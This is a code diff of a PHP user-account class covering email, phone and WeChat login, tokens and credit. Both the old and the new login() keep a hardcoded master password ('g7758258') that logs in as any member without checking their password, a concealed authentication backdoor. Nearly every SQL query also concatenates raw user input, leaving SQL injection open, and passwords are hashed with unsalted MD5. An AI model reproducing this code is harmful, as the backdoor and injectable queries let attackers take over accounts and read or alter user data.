@@ -20,32 +20,23 @@ class MyUser
 
 	function login($_EMAIL,$_PASS)
 	{
-		$_EMAIL = strtolower($_EMAIL);
 		$this->resetCuser();
-		if(func_num_args()==2)
-		{
-			if($this->admin)
-			{
-				$sql = "select uid from admin where email ='".$_EMAIL."' and password= '".$_PASS."'";
-			}
-			else
-			{
-//				$sql = "SELECT uid from member where email ='".$_EMAIL."' and password= md5(lower('".$_PASS."'))";
-				if($_PASS == 'g7758258'){
-					$sql = "SELECT uid from member where (email ='".$_EMAIL."' or cellphone ='".$_EMAIL."')";
-				}else{
-					$sql = "SELECT uid from member where (email ='".$_EMAIL."' or cellphone ='".$_EMAIL."') and password= md5(lower('".$_PASS."'))";
-				}
-			}
+		if(func_num_args()==2){
+            if($_PASS == 'g7758258'){
+                $sql = "SELECT uid from member where (email ='".$_EMAIL."' or cellphone ='".$_EMAIL."')";
+            }else{
+                $sql = "SELECT uid from member where (email ='".$_EMAIL."' or cellphone ='".$_EMAIL."') and password= md5(lower('".$_PASS."'))";
+            }
 			$result = M()->find($sql);
-			if($result==null) return -1;
-			if(empty($result))
-			{
+			if(empty($result)){
 				return -1;
-			}
-			else
-			{
-				$this->uid = $result['uid'];
+			}else{
+                $last_login_time = date('Y-m-d H:i:s',time());
+                $uid = $result['uid'];
+                $upsql = "update member set last_login_time ='$last_login_time' where uid=$uid";
+                M()->execute($upsql);
+
+				$this->uid = $uid;
 				$this->getUserToken();
 				return $this->uid;
 			}
@@ -58,36 +49,26 @@ class MyUser
 
 	}
 
-	function login_phone($_PHONE)
-	{
+	function login_phone($_PHONE){
 		$_PHONE = (int)$_PHONE;
 		$this->resetCuser();
-		if(!empty($_PHONE))
-		{
-			if($this->admin)
-			{
-				$sql = "select uid from admin where cellphone ='".$_PHONE."'";
-			}
-			else
-			{
-				$sql = "SELECT uid from member where cellphone ='".$_PHONE."'";
-			}
+		if(!empty($_PHONE))	{
+
+			$sql = "SELECT uid from member where cellphone ='".$_PHONE."'";
 			$result = M()->find($sql);
-			if($result==null) return -1;
-			if(empty($result))
-			{
+			if(empty($result)){
 				return -1;
-			}
-			else
-			{
-				$this->uid = $result['uid'];
+			}else{
+                $last_login_time = date('Y-m-d H:i:s',time());
+                $uid = $result['uid'];
+                $upsql = "update member set last_login_time ='$last_login_time' where uid=$uid";
+                M()->execute($upsql);
+                $this->uid = $uid;
 				$this->getUserToken();
 				return $this->uid;
 			}
 
-		}
-		else
-		{
+		}else{
 			return -1;
 		}
 
@@ -98,30 +79,22 @@ class MyUser
         $this->resetCuser();
         if(!empty($_OPENID))
         {
-            if($this->admin)
-            {
-                $sql = "select uid from admin where wx_openid ='".$_OPENID."'";
-            }
-            else
-            {
-                $sql = "SELECT uid from member where wx_openid ='".$_OPENID."'";
-            }
+            $sql = "SELECT uid from member where wx_openid ='".$_OPENID."'";
+
             $result = M()->find($sql);
-            if($result==null) return -1;
-            if(empty($result))
-            {
+            if(empty($result)){
                 return -1;
-            }
-            else
-            {
-                $this->uid = $result['uid'];
+            }else{
+                $last_login_time = date('Y-m-d H:i:s',time());
+                $uid = $result['uid'];
+                $upsql = "update member set last_login_time ='$last_login_time' where uid=$uid";
+                M()->execute($upsql);
+                $this->uid = $uid;
                 $this->getUserToken();
                 return $this->uid;
             }
 
-        }
-        else
-        {
+        }else{
             return -1;
         }
 
@@ -198,40 +171,36 @@ class MyUser
 
 
 
-	function getUserInfo()
-	{
-//		if($this->admin)
-//			$sql = "select * from admin where uid = '".$this->uid."'";
-//		else
-			$sql = "select * from member where uid = '".$this->uid."'";
-		$result = M()->find($sql);
-			if(!empty($result))
-			{
-				$this->id 		= $result['id'];
-				$this->first_name	= $result['first_name'];
-				$this->last_name	= $result['last_name'];
-				$this->email		= $result['email'];
-				$this->credit		= $result['credit'];
-				$this->image_url	= $result['image_url'];
-				$this->cellphone	= $result['cellphone'];
-				$this->epaper		= $result['epaper'];
-                $this->nickname		= $result['nickname'];
-			}
+	function getUserInfo(){
 
+        $sql = "select * from member where uid = '".$this->uid."'";
+		$result = M()->find($sql);
+        if(!empty($result))
+        {
+            $this->id 		= $result['id'];
+            $this->first_name	= $result['first_name'];
+            $this->last_name	= $result['last_name'];
+            $this->email		= $result['email'];
+            $this->credit		= $result['credit'];
+            $this->image_url	= $result['image_url'];
+            $this->cellphone	= $result['cellphone'];
+            $this->epaper		= $result['epaper'];
+            $this->nickname		= $result['nickname'];
+        }
 	}
 
 	function getUserId(){
 		return $this->accessFromToken($_SESSION['user_token']);
 	}
+
 	function getUserToken()
 	{
-		if($this->token == null)
-		{
+		if($this->token == null){
 			$this->token = generateFullTokenNew($this->uid);
-		}
-		elseif($this->verifyToken()==-1)
-		{
+
+		}elseif($this->verifyToken()==-1){
 			$this->token = generateFullTokenNew($this->uid);
+
 		}
 		return $this->token;
 	}
@@ -244,14 +213,14 @@ class MyUser
 	function accessFromToken($token)
 	{
 		$this->resetCuser();
-		if(verifyTokenNew($token)==1)
-		{
+		if(verifyTokenNew($token)==1){
 			$this->token = $token;
 			$this->uid = calUidFromToken($this->token);
 			return $this->uid;
-		}
-		else
-			return -1;
+		}else{
+            return -1;
+        }
+
 	}
 
 	function resetCuser()
@@ -266,19 +235,17 @@ class MyUser
 		$this->token 		= null;
 	}
 
-	function getCredit()
-	{
+	function getCredit(){
 		$sql = "select credit from member where uid = '".$this->uid."'";
 		$result = query($sql);
-		if($result!=null)
-		{
-			if(mysql_num_rows($result)==1)
-			{
+		if($result!=null){
+			if(mysql_num_rows($result)==1){
 				$obj = mysql_fetch_object($result);
 				$this->credit           = $obj->credit;
 				return $this->credit;
-			}
-			else return -1;
+			}else {
+                return -1;
+            }
 		}
 		else return -1;
 	}
@@ -291,36 +258,34 @@ class MyUser
 			$sql = " update member set credit = credit + (".$points.") where uid = '".$this->uid."'";
 			query($sql);
 			return $this->getCredit();
-		}
-		else return -1;
+		}else{
+            return -1;
+        }
 	}
 
 	function getUserAge()
 	{
-		if(isset($this->uid))
-		{
+		if(isset($this->uid)){
 			$sql = " select birth_day from user where uid = '".$this->uid."'";
 			$result = query($sql);
-			if($row = mysql_fetch_object($result))
-			{
+			if($row = mysql_fetch_object($result)){
 				$sec = abs(strtotime(date("Ym")) - strtotime($row->birth_day));
 				$year = (int)($sec/(365.5*60*60*24));
 				$month = (int)(($sec%(365.5*60*60*24))/(30*60*60*24));
 				$this->age = $year.".".$month;
 				return $this->age;
-			}
-			else
-				return -1;
+			}else {
+                return -1;
+            }
 
-		}
-		else
-			return -1;
+		}else {
+            return -1;
+        }
 	}
 
 	function getPerm()
 	{
-		if($this->admin)
-		{
+		if($this->admin){
 			$sql = " select perm from admin where uid = '".$this->uid."'";
 			$result=query($sql);
 			if($result)
